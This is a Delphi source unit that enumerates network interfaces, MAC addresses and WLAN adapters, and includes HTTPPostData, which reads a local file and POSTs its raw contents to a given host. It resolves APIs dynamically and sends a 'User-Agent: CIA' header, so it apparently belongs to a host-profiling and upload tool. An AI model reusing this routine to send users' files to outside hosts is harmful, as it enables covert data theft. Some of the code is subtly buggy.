unit EthFuncs;

interface

uses Windows, MyUtils;

const
	SIO_GET_INTERFACE_LIST = $4004747F;
  IFF_UP                 = $00000001;
  IFF_BROADCAST          = $00000002;
  IFF_LOOPBACK           = $00000004;
  IFF_POINTTOPOINT       = $00000008;
  IFF_MULTICAST          = $00000010;
  WSADESCRIPTION_LEN     = 256;
  WSASYS_STATUS_LEN      = 128;

type
  // BEGIN Winsock
  PWSAData = ^TWSAData;
  {$EXTERNALSYM WSAData}
  WSAData = record
    wVersion: Word;
    wHighVersion: Word;
    szDescription: array[0..WSADESCRIPTION_LEN] of Char;
    szSystemStatus: array[0..WSASYS_STATUS_LEN] of Char;
    iMaxSockets: Word;
    iMaxUdpDg: Word;
    lpVendorInfo: PChar;
  end;
  TWSAData = WSAData;

  TSocket = Integer;

  SunB = packed record
    s_b1, s_b2, s_b3, s_b4: Char;
  end;

  SunW = packed record
    s_w1, s_w2: Word;
  end;

  PInAddr = ^TInAddr;
  in_addr = record
    case integer of
      0: (S_un_b: SunB);
      1: (S_un_w: SunW);
      2: (S_addr: Integer);
  end;
  TInAddr = in_addr;

  PSockAddrIn = ^TSockAddrIn;
  sockaddr_in = record
    case Integer of
      0: (sin_family: Word;
          sin_port: Word;
          sin_addr: TInAddr;
          sin_zero: array[0..7] of Char);
      1: (sa_family: Word;
          sa_data: array[0..13] of Char)
  end;
  TSockAddrIn = sockaddr_in;
  // END Winsock
	SockAddr_Gen = packed record
    AddressIn: SockAddr_In;
    Padding: packed array [0..7] of Byte;
  end;

  Interface_Info = record
	  iiflags: Integer;
		iiAddress, iiNetmask, iiBroadcastAddress: SockAddr_Gen;
  end;

  tNetworkInterface = record
		AddrIP, SubnetMask, AddrNet, AddrLimitedBroadcast, AddrDirectedBroadcast, Method: string;
    IsInterfaceUp, BroadcastSupport, IsLoopback: Boolean;
  end;
	tNetworkInterfaceList = array of tNetworkInterface;

  // BEGIN WLAN INTERFACE
  Pndu_WLAN_INTERFACE_STATE = ^Tndu_WLAN_INTERFACE_STATE;
  Tndu_WLAN_INTERFACE_STATE = (
  	wlan_interface_state_not_ready = 0,
    wlan_interface_state_connected = 1,
    wlan_interface_state_ad_hoc_network_formed = 2,
    wlan_interface_state_disconnecting = 3,
    wlan_interface_state_disconnected = 4,
    wlan_interface_state_associating = 5,
    wlan_interface_state_discovering = 6,
    wlan_interface_state_authenticating = 7);

  Pndu_WLAN_INTERFACE_INFO = ^Tndu_WLAN_INTERFACE_INFO;
  Tndu_WLAN_INTERFACE_INFO = record
  	InterfaceGuid: TGUID;
    strInterfaceDescription: array[0..255] of wchar;
    isState: Tndu_WLAN_INTERFACE_STATE;
  end;

  Pndu_WLAN_INTERFACE_INFO_LIST = ^Tndu_WLAN_INTERFACE_INFO_LIST;
  PPndu_WLAN_INTERFACE_INFO_LIST = ^Pndu_WLAN_INTERFACE_INFO_LIST;
  Tndu_WLAN_INTERFACE_INFO_LIST = record
  	dwNumberOfItems: DWORD;
    dwIndex: DWORD;
    InterfaceInfo: array[0..0] of Tndu_WLAN_INTERFACE_INFO;
  end;

  TWLan = packed record
    Name: string;
    Index: array [0..10] of Integer;
  end;
  // END WLAN INTERFACE

  // BEGIN ADAPTER_INFO
const
  MAX_ADAPTER_DESCRIPTION_LENGTH = 128; // arb.
  MAX_ADAPTER_NAME_LENGTH        = 256; // arb.
  MAX_ADAPTER_ADDRESS_LENGTH     = 8; // arb.
  DEFAULT_MINIMUM_ENTITIES       = 32; // arb.
  MAX_HOSTNAME_LEN               = 128; // arb.
  MAX_DOMAIN_NAME_LEN            = 128; // arb.
  MAX_SCOPE_ID_LEN               = 256; // arb.

type
  PIP_MASK_STRING = ^IP_MASK_STRING;
  IP_ADDRESS_STRING = record
    S: array [0..15] of Char;
  end;
  PIP_ADDRESS_STRING = ^IP_ADDRESS_STRING;
  IP_MASK_STRING = IP_ADDRESS_STRING;
  TIpAddressString = IP_ADDRESS_STRING;
  PIpAddressString = PIP_MASK_STRING;

  PIP_ADDR_STRING = ^IP_ADDR_STRING;
  _IP_ADDR_STRING = record
    Next: PIP_ADDR_STRING;
    IpAddress: IP_ADDRESS_STRING;
    IpMask: IP_MASK_STRING;
    Context: DWORD;
  end;
  IP_ADDR_STRING = _IP_ADDR_STRING;
  TIpAddrString = IP_ADDR_STRING;
  PIpAddrString = PIP_ADDR_STRING;

  PIP_ADAPTER_INFO = ^IP_ADAPTER_INFO;
  _IP_ADAPTER_INFO = record
    Next: PIP_ADAPTER_INFO;
    ComboIndex: DWORD;
    AdapterName: array [0..MAX_ADAPTER_NAME_LENGTH + 3] of Char;
    Description: array [0..MAX_ADAPTER_DESCRIPTION_LENGTH + 3] of Char;
    AddressLength: UINT;
    Address: array [0..MAX_ADAPTER_ADDRESS_LENGTH - 1] of BYTE;
    Index: DWORD;
    Type_: UINT;
    DhcpEnabled: UINT;
    CurrentIpAddress: PIP_ADDR_STRING;
    IpAddressList: IP_ADDR_STRING;
    GatewayList: IP_ADDR_STRING;
    DhcpServer: IP_ADDR_STRING;
    HaveWins: BOOL;
    PrimaryWinsServer: IP_ADDR_STRING;
    SecondaryWinsServer: IP_ADDR_STRING;
    LeaseObtained: Longint;
    LeaseExpires: Longint;
  end;
  IP_ADAPTER_INFO = _IP_ADAPTER_INFO;
  TIpAdapterInfo = IP_ADAPTER_INFO;
  PIpAdapterInfo = PIP_ADAPTER_INFO;
  // END ADAPTER_INFO

  // BEGIN POST FILE
type
  PHostEnt = ^THostEnt;
  hostent = record
    h_name: PChar;
    h_aliases: ^PChar;
    h_addrtype: Smallint;
    h_length: Smallint;
    case Byte of
      0: (h_addr_list: ^PChar);
      1: (h_addr: ^PChar)
  end;
  THostEnt = hostent;

  TSockAddr = sockaddr_in;
  // END POST FILE

function WSAIoctl(aSocket: TSocket; aCommand: DWORD; lpInBuffer: Pointer; dwInBufferLen: DWORD;
lpOutBuffer: Pointer; dwOutBufferLen: DWORD; lpdwOutBytesReturned: LPDWORD;
lpOverLapped: Pointer; lpOverLappedRoutine: Pointer): Integer; stdcall; external 'WS2_32.dll';

function GetWInterface(Idx: Integer): Boolean;
function GetNetworkInterfaces(var aNetworkInterfaceList: tNetworkInterfaceList): Boolean;
function GetMacAddress(Num: DWORD): string;
function HTTPPostData(Host, Script, FilePath, Filename: string): Integer;

implementation

function GetMacAddress(Num: DWORD): string;
 var
  fGetAdaptersInfo: function(pAdapterInfo: Pointer; var pOutBufLen: ULONG): DWORD; stdcall; //pAdapterInfo = PIP_ADAPTER_INFO in IpHlpApi
  i, vpAdapterInfo, vpOutBufLen: DWORD;
begin
  Result := '-----';
  fGetAdaptersInfo := GetProcAddress(LoadLibrary('iphlpapi.dll'), 'GetAdaptersInfo');
  vpOutBufLen := 0;
  if (fGetAdaptersInfo(nil, vpOutBufLen) = 111) then
  begin
    GetMem(Pointer(vpAdapterInfo), vpOutBufLen);
    try
      if (fGetAdaptersInfo(Pointer(vpAdapterInfo), vpOutBufLen) = 0) then
        for i := PCardinal(vpAdapterInfo + (640 * Num) + 400)^ - 1 downto 0 do
          Insert(IntToHex(PByte(vpAdapterInfo + (640 * Num) + 404 + i)^, 2), Result, i + 1);
    finally
      FreeMem(Pointer(vpAdapterInfo));
    end;
  end;
end;

function GetId(MacAddress: string): Integer;
 var
  i: Integer;
  Current: Char;
  Cur: string;
begin
  for i := 0 to Length(MacAddress) do
  begin
    Current := MacAddress[i];
    try
      StrToInt(Current);
      Cur := Cur + Current;
    except
    end;
  end;
  Result := StrToInt(Cur);
end;

function GetWInterface(Idx: Integer): Boolean;
 var
  fWlanEnumInterfaces: function(hClientHandle: THandle; pReserved: Pointer; ppInterfaceList: PPndu_WLAN_INTERFACE_INFO_LIST): DWORD; stdcall;
  fWlanOpenHandle: function(dwClientVersion: DWORD; pReserved: Pointer; pdwNegotiatedVersion: PDWORD; phClientHandle: PHANDLE): DWORD; stdcall;
  fWlanCloseHandle: function(hClientHandle: THandle; pReserved: Pointer): DWORD; stdcall;

  ppInterfaceList: Pndu_WLAN_INTERFACE_INFO_LIST;
  pdwNegotiatedVersion: DWORD;
  hClientHandle: THandle;
  i: Integer;
begin
  fWlanOpenHandle := GetProcAddress(LoadLibrary('Wlanapi.dll'), 'WlanOpenHandle');
  fWlanCloseHandle := GetProcAddress(LoadLibrary('Wlanapi.dll'), 'WlanCloseHandle');
  fWlanEnumInterfaces := GetProcAddress(LoadLibrary('Wlanapi.dll'), 'WlanEnumInterfaces');

  Result := False;
  try
    if (fWlanOpenHandle(1, nil, @pdwNegotiatedVersion, @hClientHandle) = ERROR_SUCCESS) then
    begin
      if (fWlanEnumInterfaces(hClientHandle, nil, @ppInterfaceList) = ERROR_SUCCESS) then
      begin
        //(ppInterfaceList^.InterfaceInfo[Idx].strInterfaceDescription <> '')
        for i := 0 to ppInterfaceList^.dwNumberOfItems - 1 do
        begin
          if (i = Idx) then
            Result := True
        end;
      end;
    end;
  except
    fWlanCloseHandle(hClientHandle, nil);
    Result := False;
    Exit;
  end;
  fWlanCloseHandle(hClientHandle, nil);
end;

function GetNetworkInterfaces(var aNetworkInterfaceList: tNetworkInterfaceList): Boolean;
 const
  AF_INET = 2;
  INVALID_SOCKET = TSocket(not(0));
  SOCKET_ERROR = -1;
  SOCK_STREAM = 1;

 var
  aSocket: TSocket;
  aWSADataRecord: WSAData;
  NoOfBytesReturned, InterfaceFlags: Integer;
  pAddrIP, pAddrSubnetMask, pAddrBroadcast: Sockaddr_In;
  DirBroadcastDummy, NetAddrDummy: In_Addr;
  Buffer: array [0..30] of Interface_Info;
  NoOfInterfaces, i, ii: Integer;

  fGetAdaptersInfo: function(pAdapterInfo: Pointer; var pOutBufLen: ULONG): DWORD; stdcall; //pAdapterInfo = PIP_ADAPTER_INFO in IpHlpApi
  pAdapterInfo, pTempAdapterInfo: PIP_ADAPTER_INFO;
  AdapterInfo: IP_ADAPTER_INFO;
  BufLen: DWORD;
  Status: DWORD;
  strMAC: String;
  TmpMac: string;
  Find: Boolean;

  fWSAStartup: function(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;
  fSocket: function(af, Struct, protocol: Integer): TSocket; stdcall;
  finet_ntoa: function(inaddr: TInAddr): PChar; stdcall;
  fCloseSocket: function(s: TSocket): Integer; stdcall;
  fWSACleanup: function: Integer; stdcall;
begin
  fWSAStartup := GetProcAddress(LoadLibrary('WS2_32.dll'), 'WSAStartup');
  fSocket := GetProcAddress(LoadLibrary('WS2_32.dll'), 'socket');
  finet_ntoa := GetProcAddress(LoadLibrary('WS2_32.dll'), 'inet_ntoa');
  fCloseSocket := GetProcAddress(LoadLibrary('WS2_32.dll'), 'closesocket');
  fWSACleanup := GetProcAddress(LoadLibrary('WS2_32.dll'), 'WSACleanup');
  fGetAdaptersInfo := GetProcAddress(LoadLibrary('iphlpapi.dll'), 'GetAdaptersInfo');

  Find := False;
  BufLen := SizeOf(AdapterInfo);
  pAdapterInfo := @AdapterInfo;
  Status := fGetAdaptersInfo(nil, BufLen);
  pAdapterInfo := AllocMem(BufLen);
  Status := fGetAdaptersInfo(pAdapterInfo, BufLen);

  Result := False;
  SetLength (aNetworkInterfaceList, 0);
  fWSAStartup(MAKEWorD(2, 0), aWSADataRecord);
  aSocket := fSocket(AF_INET, SOCK_STREAM, 0);
  if (aSocket = INVALID_SOCKET) then
	  Exit;
  try
    if WSAIoCtl(aSocket, SIO_GET_INTERFACE_LIST, nil, 0, @Buffer, 1024, @NoOfBytesReturned, nil, nil) <> SOCKET_ERROR then
    begin
      NoOfInterfaces := NoOfBytesReturned  div SizeOf(Interface_Info);
      SetLength(aNetworkInterfaceList, NoOfInterfaces);
      for i := 0 to NoOfInterfaces - 1 do
      begin
        with aNetworkInterfaceList[i] do
        begin
          InterfaceFlags := Buffer[i].iiflags;
          if ((InterfaceFlags and IFF_UP) = IFF_UP) then
			      IsInterfaceUp := True
          else
			      IsInterfaceUp := False;

          if ((InterfaceFlags and IFF_BROADCAST) = IFF_BROADCAST) then
			      BroadcastSupport := True
		      else
			      BroadcastSupport := False;

          if ((InterfaceFlags and IFF_LOOPBACK) = IFF_LOOPBACK) then
			      IsLoopback := True
          else
			      IsLoopback := False;

          if ((not IsLoopback) and (BroadcastSupport)) then
          begin
            TmpMac := GetMacAddress(i);
            while (pAdapterInfo <> nil) do
            begin
              strMAC := '';
              for ii := 0 to pAdapterInfo^.AddressLength - 1 do
                strMAC := strMAC + '-' + IntToHex(pAdapterInfo^.Address[ii], 2);

              Delete(strMAC, 1, 1);
              if (strMAC = TmpMac) then
              begin
                Find := True;
                Break;
              end else
                if (not find) then
                  Find := False;

              //strMAC:=pAdapterInfo^.IpAddressList.IpAddress.S;
              //strMAC:=pAdapterInfo^.IpAddressList.IpMask.S;
              //strings.Add('MAC address: ' + strMAC);
              //strings.Add('IP address: ' + pAdapterInfo^.IpAddressList.IpAddress.S);
              //strings.Add('IP subnet mask: ' + pAdapterInfo^.IpAddressList.IpMask.S);
              //strings.Add('Gateway: ' + pAdapterInfo^.GatewayList.IpAddress.S);
              //strings.Add('DHCP enabled: ' + IntTOStr(pAdapterInfo^.DhcpEnabled));
              //strings.Add('DHCP: ' + pAdapterInfo^.DhcpServer.IpAddress.S);
              //strings.Add('Have WINS: ' + BoolToStr(pAdapterInfo^.HaveWins,True));
              //strings.Add('Primary WINS: ' + pAdapterInfo^.PrimaryWinsServer.IpAddress.S);
              //strings.Add('Secondary WINS: ' + pAdapterInfo^.SecondaryWinsServer.IpAddress.S);

              pTempAdapterInfo := pAdapterInfo;
              pAdapterInfo:= pAdapterInfo^.Next;
            end;
          end else
            Find := False;

          // Get the IP address
          pAddrIP                  := Buffer[i].iiAddress.AddressIn;
          AddrIP                   := string(finet_ntoa(pAddrIP.Sin_Addr));
          // Get the subnet mask
          pAddrSubnetMask          := Buffer[i].iiNetMask.AddressIn;
          SubnetMask               := string(finet_ntoa(pAddrSubnetMask.Sin_Addr));
          Method := '';

          // Get the limited broadcast address
          pAddrBroadcast           := Buffer[i].iiBroadCastAddress.AddressIn;
          AddrLimitedBroadcast     := string(finet_ntoa(pAddrBroadcast.Sin_Addr));
          // Calculate the net and the directed broadcast address
          NetAddrDummy.S_addr      := Buffer[i].iiAddress.AddressIn.Sin_Addr.S_Addr;
          NetAddrDummy.S_addr      := NetAddrDummy.S_addr and Buffer[i].iiNetMask.AddressIn.Sin_Addr.S_Addr;
          DirBroadcastDummy.S_addr := NetAddrDummy.S_addr or Not Buffer[i].iiNetMask.AddressIn.Sin_Addr.S_Addr;
          AddrNet                  := string(finet_ntoa((NetAddrDummy)));
          AddrDirectedBroadcast    := string(finet_ntoa((DirBroadcastDummy)));

          if Find then
          begin
            AddrIP                 := pAdapterInfo^.IpAddressList.IpAddress.S;
            SubnetMask             := pAdapterInfo^.IpAddressList.IpMask.S;
            if Boolean(pAdapterInfo^.DhcpEnabled) then
              Method := 'dhcp'
            else
              Method := 'static';
          end;
        end;
      end;
    end;
  except
    //Result := False;
  end;
  //Dispose(pAdapterInfo);
  fCloseSocket(aSocket);
  Result := True;
  fWSACleanUp;
end;

{====================BEGIN POST FILE FUNCTIONS============================}
{=========================================================================}

function GetIPFromHost(const HostName: string): string;
 type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
 var
  i: Integer;
  phe: PHostEnt;
  pptr: PaPInAddr;
  GInitData: TWSAData;
  fWSACleanup: function: Integer; stdcall;
  finet_ntoa: function(inaddr: TInAddr): PChar; stdcall;
  fGetHostByName: function(name: PChar): PHostEnt; stdcall;
  fWSAStartup: function(wVersionRequired: Word; var WSData: TWSAData): Integer; stdcall;
begin
  finet_ntoa := GetProcAddress(LoadLibrary('WS2_32.dll'), 'inet_ntoa');
  fWSAStartup := GetProcAddress(LoadLibrary('WS2_32.dll'), 'WSAStartup');
  fWSACleanup := GetProcAddress(LoadLibrary('WS2_32.dll'), 'WSACleanup');
  fGetHostByName := GetProcAddress(LoadLibrary('WS2_32.dll'), 'gethostbyname');

  fWSAStartup($101, GInitData);
  Result := '';
  phe := fGetHostByName(PChar(HostName));
  if (phe = nil) then
    Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while (pPtr^[i] <> nil) do
  begin
    Result := finet_ntoa(pptr^[i]^);
    Inc(i);
  end;
  fWSACleanup;
end;

function FiletoString(FilePath: string; var Buffer: string): Boolean;
 var
  fhandle: THandle;
  dSize: DWORD;
  dRead: DWORD;
begin
  Result := False;
  fhandle := CreateFile(PChar(FilePath), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if (fhandle <> 0) then
  begin
    dSize := GetFileSize(fhandle, nil);
    if (dSize <> 0) then
    begin
      SetFilepointer(fhandle, 0, nil, FILE_BEGIN);
      SetLength(Buffer, dSize);
      if ReadFile(fhandle, Buffer[1], dSize, dRead, nil) then
      begin
        Result := True;
      end;
      CloseHandle(fhandle);
    end;
  end;
end;

function HTTPPostData(Host, Script, FilePath, Filename: string): Integer;
 const
  AF_INET = 2;
  SOCK_STREAM = 1;
  IPPROTO_TCP = 6;
 var
  sSock: TSocket;
  sAddr: TSockAddrIn;
  sWsa: TWSAData;
  sPort, rturn: Integer;
  data, fileContents, bodySize, bodyContents, hostIp, boundary, formName: string;

  fhtons: function(hostshort: Word): Word; stdcall;
  finet_addr: function(cp: PChar): LongInt; stdcall;
  fCloseSocket: function(s: TSocket): Integer; stdcall;
  fSocket: function(af, Struct, protocol: Integer): TSocket; stdcall;
  fsend: function(s: TSocket; var Buf; len, flags: Integer): Integer; stdcall;
  fWSAStartup: function(wVersionRequired: word; var WSData: TWSAData): Integer; stdcall;
  fconnect: function(s: TSocket; var name: TSockAddr; namelen: Integer): Integer; stdcall;
begin
  fsend := GetProcAddress(LoadLibrary('WS2_32.dll'), 'send');
  fhtons := GetProcAddress(LoadLibrary('WS2_32.dll'), 'htons');
  fSocket := GetProcAddress(LoadLibrary('WS2_32.dll'), 'socket');
  fconnect := GetProcAddress(LoadLibrary('WS2_32.dll'), 'connect');
  finet_addr := GetProcAddress(LoadLibrary('WS2_32.dll'), 'inet_addr');
  fWSAStartup := GetProcAddress(LoadLibrary('WS2_32.dll'), 'WSAStartup');
  fCloseSocket := GetProcAddress(LoadLibrary('WS2_32.dll'), 'closesocket');

  sPort := 80;
  //boundary := '---------------------------282861610524488';
  boundary := '';
  formName := 'data';
  //read file
  if  not FiletoString(FilePath, fileContents) then
  begin
    Result := -1;
    Exit;
  end;

  bodyContents := '--' + boundary + #13#10;
  //bodyContents := bodyContents + 'Content-Disposition: form-data; name="' + formName + '"; filename="' + FileName +'"';
  bodyContents := bodyContents + #13#10 + 'application/x-www-form-urlencoded;';
  //bodyContents := bodyContents + #13#10 + 'Content=' + fileContents;
  bodyContents := bodyContents + #13#10 + #13#10 + fileContents + #13#10;
  //bodyContents := bodyContents  + '--' + boundary + '--' + #13#10;
  bodySize := IntToStr(Length(bodyContents));

  //generate headers and body
  data := 'POST ' + script + ' HTTP/1.1' + #13#10 + 'Host: ' + host  + #13#10;
  data := data + 'User-Agent: CIA' + #13#10;
  data := data + 'Accept: text/html; q=0.9,*/*;q=0.8' + #13#10;
  data := data + 'Content-Type: application/x-www-form-urlencoded;' + #13#10;
  //data := data + 'Content-Type: text-plain; boundary=' + boundary + #13#10;
  //data := data + 'Connection: Keep-Alive' + #13#10;
  data := data + 'Content-Length: ' + bodySize + #13#10 + #13#10;
  data := data + '';
  //data := data + 'Content=';
  data := data + 'content=' + fileContents;
  //data := data + bodyContents;

  fWSAStartup($1010, sWsa);
  sSock := fSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  //get ip from hostname
  hostIp := GetIpFromHost(host);

  if (hostIp = '') then
  begin
    Result := -2;
    Exit;
  end;

  sAddr.sin_family := AF_INET;
  sAddr.sin_port := fhtons(sPort);
  sAddr.sin_addr.S_addr := finet_addr(PChar(hostIp));

  rturn := fconnect(sSock, sAddr, SizeOf(sAddr));

  if (rturn = -1) Then
  begin
    Result := -3;
    Exit;
  end else begin
    rturn := fsend(sSock, data[1], Length(data), 0);
    Sleep(4000);
    fCloseSocket(sSock);
    Result := 0;
  end;
end;

{========================END POST FILE FUNCTIONS==========================}
{=========================================================================}

end.
